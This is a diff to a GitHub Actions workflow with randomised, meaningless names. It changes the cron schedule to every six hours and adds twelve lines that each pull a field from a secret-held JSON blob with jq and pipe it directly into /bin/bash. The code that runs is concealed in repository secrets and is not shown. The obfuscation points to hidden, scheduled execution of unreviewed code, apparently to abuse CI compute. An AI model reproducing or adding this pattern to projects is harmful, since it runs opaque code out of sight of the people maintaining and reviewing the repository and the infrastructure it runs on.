@@ -3,9 +3,8 @@ name: yandali3478
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
-
-jobs:  # 7044
+    - cron: '19 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,11 +12,18 @@ jobs:  # 7044
       - uses: actions/checkout@v4
       - name: yandali3478
         env:
-          lmogr3604: ${{ secrets.lmogr3604 }}
+          zmaf8: ${{ secrets.zmaf8 }}
         run: |
-          echo $lmogr3604 | jq -r .k89 | /bin/bash
-          echo $fzug8 | jq -r .n3 | /bin/bash
-          echo $p827 | jq -r .ijpjw346 | /bin/bash
-          echo $cdntd170 | jq -r .zylq910 | /bin/bash
-          echo $lnp36 | jq -r .fzw30910 | /bin/bash
+          echo $zmaf8 | jq -r .sp67682 | /bin/bash
+          echo $o88544 | jq -r .exba7 | /bin/bash
+          echo $ylja35359 | jq -r .m2428 | /bin/bash
+          echo $kehz21636 | jq -r .tzgn17821 | /bin/bash
+          echo $kxlv0 | jq -r .ko08237 | /bin/bash
+          echo $iz19713 | jq -r .fx02 | /bin/bash
+          echo $tmm23166 | jq -r .ck888 | /bin/bash
+          echo $pj418 | jq -r .egszf5 | /bin/bash
+          echo $t20804 | jq -r .wx9 | /bin/bash
+          echo $wo36 | jq -r .bwd8333 | /bin/bash
+          echo $cqx163 | jq -r .fttkp5 | /bin/bash
+          echo $eccuz06775 | jq -r .sc11 | /bin/bash
 
